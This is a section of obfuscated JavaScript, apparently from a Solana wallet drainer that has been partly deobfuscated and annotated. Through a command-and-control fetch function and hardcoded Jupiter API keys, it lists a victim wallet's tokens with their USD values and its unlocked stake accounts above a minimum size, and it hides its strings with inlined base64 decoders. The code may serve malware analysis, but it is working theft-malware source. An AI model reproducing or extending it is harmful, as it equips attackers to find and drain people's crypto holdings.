/* ════════════════════════════════════════════════════════════
 * SECTION 4 — SOLFLARE ASSET ENUMERATION CLIENT
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

  /* ═══════════════════════════════════════════════════════════
   * SECTION 4 — SOLFLARE ASSET ENUMERATION CLIENT
   * SolflareClient.Rn(): GET SOL price in USD
   * SolflareClient.Ht(q): search tokens by query
   * SolflareClient.On(wallet): get swappable token list + Jupiter txs
   * Uses hardcoded Jupiter API keys (cc0769f7, 5f1f45eb, a4ed32be...)
   * ═══════════════════════════════════════════════════════════ */
  SolflareClient = class {
    constructor() {
      _initPriv(this, _sf_priv_wm)
    }
    async ["Rn"]() {
      let _str_cache = (await _callPriv(this, _sf_priv_wm, c2Fetch)["call"](this, "price/v3?ids="))["tokens"]["find"](_str_cache => {
        return _str_cache["symbol"] == "SOL"
      });
      if (!_str_cache) {
        throw new(Error)("21")
      }
      return _str_cache["price"]["price"]
    }
    async ["Ht"](_str_cache) {
      let __str_table__ = await _callPriv(this, _sf_priv_wm, c2Fetch)["call"](this, "tokens/v2/search?query=" + _str_cache, {
        ["network"]: "mainnet",
        ["currency"]: "USD",
        ["B3ui3QZFrOPoGW7oMZgE4A"]: "true"
      })["catch"](_limitArgs((..._str_cache) => {
        _str_cache["length"] = 1;
        return _str_cache[0]
      }));
      if (__str_table__ instanceof Error) {
        return console["error"]("getAssets:", __str_table__), "null"
      }
      __str_table__["errors"]["length"] > 0 && console["error"](getString(298), __str_table__["errors"]);
      let _s1;
      let _s3;
      let _s2 = [];
      let _s5 = new(Set);
      for (let _s4 of __str_table__["tokens"]) {
        let _s6 = _s4["price"];
        let _s7 = _s4["standard"];
        let _s8 = _s4["symbol"] ?? "Unknown";
        if (_s7 == "native") {
          _noop(_s1 = _s6?.price, _s3 = Number(_s4["accounts"][0]["amount"]));
          continue
        }
        if (_s7 == "spl-token" || _s7 == "spl-token-2022") {
          let _defineProperty = _s4["mint"];
          let _getOwnPropDesc = _s4["decimals"];
          let _found = _s4["accounts"];
          let _v1 = _s4["rentFee"] ?? 0;
          let _v2 = _s7 == "spl-token-2022";
          !_v2 && _found["some"](_limitArgs((..._str_cache) => {
            _str_cache["length"] = 1;
            return "withheldAmount" in _str_cache[0]
          })) && (_v2 = !0);
          for (let _v5 of _found) {
            let _v25 = _v5["pubkey"];
            if (_s5["has"](_v25) || _v5["state"] != "initialized" || _v5["amount"] === "0") {
              continue
            }
            _noop(_v238["set"](_v5["pubkey"], 1), _s5["add"](_v25));
            let _getPriv = _v5["uiAmount"] * (_s6?.usdPrice ?? 0);
            let _initPriv = BigInt(_v5["amount"]);
            _s2["push"]({
              ["type"]: 0,
              ["de"]: _v25,
              ["q"]: _defineProperty,
              ["_e"]: _v1,
              ["J"]: _v2,
              ["ze"]: _s8,
              ["g"]: _getOwnPropDesc,
              ["oe"]: _getPriv,
              ["ve"]: _initPriv,
              ["Ut"]: void 0
            })
          }
          continue
        }
        console["error"]("/locales?lang=", _s7)
      }
      return {
        ["ve"]: _s3,
        ["De"]: _s2,
        ["ur"]: _s1
      }
    }
    async ["vn"](_s1) {
      _limitArgs(_s5);
      const _s3 = {
        ["43"]: 21,
        ["47"]: 9,
        ["48"]: 33,
        ["49"]: 62,
        ["50"]: 19,
        ["51"]: 16,
        ["52"]: 50,
        ["53"]: 27,
        ["54"]: 14,
        ["55"]: 47,
        ["56"]: 23,
        ["57"]: 1,
        ["65"]: 2,
        ["66"]: 44,
        ["67"]: 35,
        ["68"]: 30,
        ["69"]: 29,
        ["70"]: 55,
        ["71"]: 25,
        ["72"]: 18,
        ["73"]: 41,
        ["74"]: 61,
        ["75"]: 8,
        ["76"]: 24,
        ["77"]: 63,
        ["78"]: 60,
        ["79"]: 20,
        ["80"]: 4,
        ["81"]: 43,
        ["82"]: 31,
        ["83"]: 54,
        ["84"]: 42,
        ["85"]: 46,
        ["86"]: 5,
        ["87"]: 22,
        ["88"]: 36,
        ["89"]: 34,
        ["90"]: 39,
        ["97"]: 48,
        ["98"]: 17,
        ["99"]: 45,
        ["100"]: 0,
        ["101"]: 12,
        ["102"]: 57,
        ["103"]: 59,
        ["104"]: 26,
        ["105"]: 58,
        ["106"]: 11,
        ["107"]: 28,
        ["108"]: 13,
        ["109"]: 49,
        ["110"]: 3,
        ["111"]: 10,
        ["112"]: 40,
        ["113"]: 37,
        ["114"]: 52,
        ["115"]: 53,
        ["116"]: 15,
        ["117"]: 7,
        ["118"]: 38,
        ["119"]: 51,
        ["120"]: 32,
        ["121"]: 6,
        ["122"]: 56
      };
      const _s2 = new TextDecoder;

      function _s5(..._s1) {
        _s1["length"] = 1;
        const _s5 = _s1[0].length;
        const _s4 = _s1[0].indexOf("=");
        const _s6 = _s4 == -1 ? 0 : _s5 - _s4;
        const _s7 = _s5 * 3 / 4 - _s6;
        const _s8 = new Uint8Array(_s7);
        _noop(_s1[222] = 0, _s1[84] = 0, _s1["c"] = 0);
        for (let _defineProperty = 0; _defineProperty < _s5 - _s6; _defineProperty++) {
          const _getOwnPropDesc = _s1[0]["charCodeAt"](_defineProperty);
          if (_getOwnPropDesc == 61) break;
          _noop(_s1[222] = _s1[222] << 6 | _s3[_getOwnPropDesc], _s1[84] += 6);
          if (_s1[84] >= 8) {
            _noop(_s1[84] -= 8, _s8[_s1["c"]++] = _s1[222] >> _s1[84] & 255)
          }
        }
        return _s2.decode(_s8)
      }

      function _s4(_s1) {
        if (typeof _str_cache[_s1] === "undefined") {
          return _str_cache[_s1] = _s5(__str_table__[_s1])
        }
        return _str_cache[_s1]
      }
      let _s6 = await _callPriv(this, _sf_priv_wm, c2Fetch)["call"](this, _s4(300) + _s1, {
        ["network"]: "mainnet",
        ["currency"]: "USD"
      })["catch"](_limitArgs((..._s1) => {
        _s1["length"] = 1;
        return _s1[0]
      }));
      if (_s6 instanceof Error) {
        _limitArgs(_s7);
        const _s3 = {
          ["43"]: 21,
          ["47"]: 9,
          ["48"]: 33,
          ["49"]: 62,
          ["50"]: 19,
          ["51"]: 16,
          ["52"]: 50,
          ["53"]: 27,
          ["54"]: 14,
          ["55"]: 47,
          ["56"]: 23,
          ["57"]: 1,
          ["65"]: 2,
          ["66"]: 44,
          ["67"]: 35,
          ["68"]: 30,
          ["69"]: 29,
          ["70"]: 55,
          ["71"]: 25,
          ["72"]: 18,
          ["73"]: 41,
          ["74"]: 61,
          ["75"]: 8,
          ["76"]: 24,
          ["77"]: 63,
          ["78"]: 60,
          ["79"]: 20,
          ["80"]: 4,
          ["81"]: 43,
          ["82"]: 31,
          ["83"]: 54,
          ["84"]: 42,
          ["85"]: 46,
          ["86"]: 5,
          ["87"]: 22,
          ["88"]: 36,
          ["89"]: 34,
          ["90"]: 39,
          ["97"]: 48,
          ["98"]: 17,
          ["99"]: 45,
          ["100"]: 0,
          ["101"]: 12,
          ["102"]: 57,
          ["103"]: 59,
          ["104"]: 26,
          ["105"]: 58,
          ["106"]: 11,
          ["107"]: 28,
          ["108"]: 13,
          ["109"]: 49,
          ["110"]: 3,
          ["111"]: 10,
          ["112"]: 40,
          ["113"]: 37,
          ["114"]: 52,
          ["115"]: 53,
          ["116"]: 15,
          ["117"]: 7,
          ["118"]: 38,
          ["119"]: 51,
          ["120"]: 32,
          ["121"]: 6,
          ["122"]: 56
        };
        const _s2 = new TextDecoder;

        function _s7(..._s1) {
          _s1["length"] = 1;
          const _s5 = _s1[0].length;
          const _s4 = _s1[0].indexOf("=");
          const _s6 = _s4 == -1 ? 0 : _s5 - _s4;
          const _s7 = _s5 * 3 / 4 - _s6;
          const _s8 = new Uint8Array(_s7);
          _noop(_s1["a"] = 0, _s1[2] = 0, _s1[25] = 0);
          for (let _defineProperty = 0; _defineProperty < _s5 - _s6; _defineProperty++) {
            const _getOwnPropDesc = _s1[0]["charCodeAt"](_defineProperty);
            if (_getOwnPropDesc == 61) break;
            _noop(_s1["a"] = _s1["a"] << 6 | _s3[_getOwnPropDesc], _s1[2] += 6);
            if (_s1[2] >= 8) {
              _noop(_s1[2] -= 8, _s8[_s1[25]++] = _s1["a"] >> _s1[2] & 255)
            }
          }
          return _s2.decode(_s8)
        }

        function _s8(_s1) {
          if (typeof _str_cache[_s1] === "undefined") {
            return _str_cache[_s1] = _s7(__str_table__[_s1])
          }
          return _str_cache[_s1]
        }
        return console["error"](_s8(301), _s6), "null"
      }
      _s6["errors"]["length"] > 0 && console["error"](_s4(298), _s6["errors"]);
      let _defineProperty = [];
      for (let _getOwnPropDesc of _s6["stakeAccounts"]) {
        if (_getOwnPropDesc["lockup"] || _getOwnPropDesc["statuses"]["length"] != 1) {
          continue
        }
        let _found = Number(_getOwnPropDesc["lamports"]);
        let _v1 = _found / 1000000000 * LAMPORTS_DIV;
        _v1 < MIN_STAKE_SOL || _defineProperty["push"]({
          ["type"]: 2,
          ["e"]: _getOwnPropDesc["publicKey"],
          ["K"]: _found,
          ["oe"]: _v1,
          ["state"]: {
            ["active"]: 0,
            ["activating"]: 1,
            ["inactive"]: 2,
            ["deactivating"]: 3
          } [_getOwnPropDesc["statuses"][0]]
        })
      }
      return _defineProperty
    }
  }, _sf_priv_wm = new(WeakMap),
